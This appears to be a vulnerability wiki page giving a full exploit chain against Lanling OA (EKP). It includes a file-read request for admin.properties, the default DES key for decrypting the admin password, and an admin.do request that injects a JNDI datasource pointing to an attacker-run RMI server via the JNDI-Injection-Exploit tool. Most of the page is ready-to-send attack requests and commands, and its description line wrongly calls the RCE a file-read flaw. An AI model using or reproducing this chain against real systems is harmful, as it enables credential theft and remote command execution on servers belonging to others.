# Lanling OA admin.do JNDI remote command execution

## Vulnerability Description

Shenzhen Lanling Software Co., Ltd. Digital OA (EKP) has an arbitrary file reading vulnerability. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Lan Ling OA</span>

## Network surveying and mapping



## Vulnerability reappears

Read configuration files using `Lanling OA custom.jsp arbitrary file read vulnerability`

```plain
/WEB-INF/KmssConfig/admin.properties
```

Send a request packet

```plain
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 60
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/lanling-4.png)



After obtaining password, use the DES method to decrypt it. The default key is `kmssAdminKey`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/lanling-5.png)



Access the background address and log in with a decrypted password

```plain
http://xxx.xxx.xxx.xxx/admin.do
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/lanling-6.png)




</a-alert>
<br/>

```plain
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]
```

Run the tool to listen to the port ping dnslog test command execution (Lan Ling OA uses JDK 1.7 by default)

```shell
POST /admin.do HTTP/1.1
Host: 
Cookie: JSESSIONID=90EA764774514A566C480E9726BB3D3F; Hm_lvt_9838edd365000f753ebfdc508bf832d3=1620456866; Hm_lpvt_9838edd365000f753ebfdc508bf832d3=1620459967
Content-Length: 70
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Origin: 
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

method=testDbConn&datasource=rmi://xxx.xxx.xxx.xxx:1099/cbdsdg
```



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/lanling-7.png)